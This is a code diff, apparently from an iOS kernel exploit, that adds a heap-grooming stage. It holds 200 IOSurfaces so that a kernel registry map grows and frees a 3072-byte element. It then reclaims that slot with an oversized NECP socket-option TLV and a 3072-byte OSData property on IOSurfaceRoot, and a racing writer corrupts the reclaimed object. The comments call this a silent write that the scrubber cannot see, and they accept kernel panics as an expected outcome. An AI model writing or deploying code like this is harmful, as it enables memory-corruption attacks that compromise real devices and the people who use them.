@@ -32,6 +32,8 @@
 #import <fcntl.h>
 #import <mach/mach.h>
 #import <pthread.h>
+#import <sys/socket.h>
+#import <sys/errno.h>
 #import <stdatomic.h>
 #import <stdint.h>
 #import <stdio.h>
@@ -39,7 +41,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P130_BUILD   @"p130-fencesecondtable-v1"
+#define P130_BUILD   @"p130-fencesecondtable-v2"
 #define P130_SURF_W  64
 #define P130_SURF_H  64
 #define P130_RECYCLE 8
@@ -188,6 +190,94 @@ static void p130_bandit(const char *outcome) {
         L(@"[-] STOP dlsym"); p130_bandit("nodlsym"); return P130R();
     }
     p130_law_dict();
+
+    /* ══ v2 PRE-STAGE: the 3072 clean-write experiment ══
+       (Rank 1 of the recipe — findings/2026-11-20_3072_activity_write_recipe.md)
+       GROW: 200 surfaces held — the registry map crosses the 192-cap
+       (192×16=3072) and the growth kfree_data's the old 3072 element.
+       RECLAIM: the freed slot raced by 3072-class allocations — the NECP
+       long-string + the OSData property attempts, each with its verdict row.
+       WRITE: the fencer's blit churn continues on held sids — the racing
+       writer (the flagged single-store instance) writes {sid|metric,(1,1)}
+       into the slot. SURVIVED = the write landed in a LIVE reclaimed object
+       (the scrubber is blind to allocated elements — the SILENT write).
+       The panic = the free won (retry next boot). PANIC-POSSIBLE law kept. */
+    {
+        #define P130_GROW_HOLD 200
+        static void *p130growHold[P130_GROW_HOLD];
+        static int  p130grown = 0;
+        p130grown = 0;
+        for (int i = 0; i < P130_GROW_HOLD; i++) {
+            void *s = g_surfCreate(g_dict);
+            if (!s) break;
+            p130growHold[p130grown++] = s;
+        }
+        Lf(@"[v2-GROW] %d surfaces held — the registry map crossed the 192-cap "
+           @"(the old 3072 element kfree_data'd at the growth)", p130grown);
+
+        /* (a) the NECP long-string attempt: kalloc(strlen+1) → 3072 at 3071 */
+        {
+            int sfd = socket(AF_INET, SOCK_DGRAM, 0);
+            int necpOK = 0, necpErr = 0;
+            if (sfd >= 0) {
+                unsigned char tlv[3071 + 4];
+                tlv[0] = 0x07;                       /* the A14 working TLV type */
+                tlv[1] = 0;
+                tlv[2] = (unsigned char)((3071 >> 8) & 0xff);
+                tlv[3] = (unsigned char)(3071 & 0xff);
+                memset(tlv + 4, 'N', 3071);
+                if (setsockopt(sfd, 0xffff /* SOL_SOCKET */,
+                               0x1109 /* SO_NECP_ATTRIBUTES */,
+                               tlv, (socklen_t)sizeof tlv) == 0)
+                    necpOK = 1;
+                else
+                    necpErr = errno;
+                close(sfd);
+            }
+            Lf(@"[v2-RECLAIM-a] NECP 3071-B TLV: %@ (errno=%d) — %@",
+               necpOK ? @"ACCEPTED (a 3072 kalloc_data claimed)" : @"rejected",
+               necpErr,
+               necpOK ? @"the channel CARRIES 3072" :
+               @"the channel caps below 3072 (the A14 255 law) — the OSData row is the fallback");
+        }
+
+        /* (b) the OSData property attempt: a 3072-byte CFData on IOSurfaceRoot */
+        {
+            typedef kern_return_t (*p130_setprop_t)(io_registry_entry_t, CFStringRef, CFTypeRef);
+            static p130_setprop_t pSetProp;
+            if (!pSetProp) {
+                void *iok = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+                pSetProp = iok ? (p130_setprop_t)dlsym(iok, "IORegistryEntrySetCFProperty") : NULL;
+            }
+            int propOK = -1; unsigned propKr = 0;
+            io_service_t svc = pSetProp ?
+                IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot")) : 0;
+            if (svc) {
+                unsigned char bytes[3072];
+                memset(bytes, 'D', sizeof bytes);
+                CFDataRef d = CFDataCreate(kCFAllocatorDefault, bytes, sizeof bytes);
+                if (d) {
+                    kern_return_t kr = pSetProp(svc, CFSTR("p130v2-reclaim"), d);
+                    propOK = (kr == kIOReturnSuccess); propKr = (unsigned)kr;
+                    CFRelease(d);
+                }
+                IOObjectRelease(svc);
+            }
+            Lf(@"[v2-RECLAIM-b] OSData 3072 property: %@ (kr=0x%x) — %@",
+               propOK == 1 ? @"ACCEPTED (the OSData buffer claimed)" :
+               propOK == 0 ? @"rejected" : @"no channel (dlsym/service)",
+               propKr,
+               propOK == 1 ? @"the KHEAP_DATA_PRIVATE 3072 lever works" :
+               @"the property path is gated — the panic receipts still map the writer");
+        }
+
+        /* the write stage rides the existing fencer below — the churn
+           continues on held sids while the growth's freed slot is racing.
+           The held surfaces release at tap end (the bounded pool law). */
+        L(@"[v2-WRITE] the fencer's blit churn now writes into the raced slot —");
+        L(@"  SURVIVED = the silent write (a live reclaim took it);");
+        L(@"  the panic = the free won the race (retry next fresh boot).");
+    }
 
     /* ---- thread A starts, then the p073 engine fires ---- */
     L(@"--- stage 1: fence churn STARTS, then the p073 engine fires ---");
